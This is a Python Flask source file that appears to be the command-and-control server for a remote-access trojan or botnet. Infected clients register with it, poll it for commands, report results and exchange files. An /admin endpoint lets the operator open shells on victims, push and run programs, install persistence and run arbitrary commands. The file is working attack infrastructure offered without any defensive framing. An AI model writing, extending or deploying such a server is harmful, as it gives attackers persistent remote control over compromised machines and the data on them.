#!/usr/bin/python3

from flask import Flask
from flask import request, send_file, send_from_directory, safe_join, abort
import requests

from myManager import manager,decodeJwt,encodeJwt,startServer
#from killableThread import thread_with_trace
#from myclient import client

import time
import logging


###############################     ROUTES  ########################################
app = Flask(__name__)
master=manager()


#UID MUST BE PASSED TO PROVE REGISTRATION
def requireRegister():
    uid = request.headers.get('x-auth')
    uid,aproved = decodeJwt(uid)
    return uid["uid"],aproved


#response -> {x-auth:jwt,aproved: true}
@app.route('/register', methods=["GET"])
def register():
    uid,aproved=master.register(request.remote_addr)
    return {"x-auth":uid,"aproved":aproved},200

#example of return  list of unfinished tasks {taskuid1:cmd1,taskuid2:cmd2 ...} 
@app.route('/getcmd', methods=["GET"])
def getCmd():
    uid,aproved=requireRegister()
    if not aproved:
        return "Forbidden",403

    command = master.getCmd(uid)
    if command!=None:
        return {"cmd":command},200
    else:
        return "NOP",404

#report example {taskuid uid:aaaaa,report:"data"} }
#response {result:"OK"}
@app.route('/report', methods=["POST"])
def report():
    uid,aproved=requireRegister()
    if not aproved:
        return "Forbidden",403

    print(request)
    result=request.json["response"]
    master.report(uid,result)
    return {"result":"OK"},200

#simple upload file
@app.route('/upload', methods=["POST"])
def upload_file():
    uid,aproved=requireRegister()
    if uid==None:
        return "Forbidden",403
        
    uploaded_file = request.files['file']
    result = master.saveFile(uid,uploaded_file)
    return result

#simple downloadFile
@app.route('/download', methods=["GET"])
def getFile():
    uid,aproved=requireRegister()
    if uid==None:
        return "Forbidden",403

    print(uid,type(uid))
    filename =master.getFile(uid)
    if filename!=None:
        return send_from_directory("files", filename="paimon.png", as_attachment=True), 200
    else:
        return "Error",404

@app.route('/admin', methods=["POST"])
def adminCmd():
    try:
        return parseJsonPOST_RPC(request.json,master)
    except Exception as e:
        print('---------------------------------')
        print("error in: " + str(e))


########################    HELPERS    #########################

def parseJsonPOST_RPC(json,master):

    status_return=200
    if (json["CMD"]=="displayClients"):
        print("RPC DISPLAY",json)
        result=master.displayClients()

    elif (json["CMD"]=="abrirShell"):
        print("RPC abrirShell",json)
        result=master.abrirShell(json["uid"],json["addr"],json["port"])
        if (json["uid"] < len(master.clientList) and json["uid"] >= 0):
            status_return = 200
        else:
            status_return = 400

    elif (json["CMD"]=="sendFile"):
        print("RPC sendFile",json)
        result=master.sendFile(json["fname"],json["uid"])
    
    elif (json["CMD"]=="downloadFile"):
        print("RPC downloadFile",json)
        result=master.downloadFile(json["fname"],json["uid"])
    
    elif(json["CMD"]=="executeProgram"):
        print("RPC executeProgram",json)
        result=master.executeProgram(json["fname"],json["uid"])

    elif(json["CMD"]=="installPersistency"):
        print("RPC installPersistency",json)
        result=master.installPersistency(json["uid"])

    elif(json["CMD"]=="runCommand"):
        print("RPC runCommand",json)
        result=master.runCommand(json["cmdString"],json["uid"])

    elif (json["CMD"]=="testServer"):
        print("RPC test server", json)
        result=master.testServer()
    else:
        return {"status":"unkown"},401
    
    return {"status":result},status_return


app.run("0.0.0.0",port=8080, use_reloader=False)


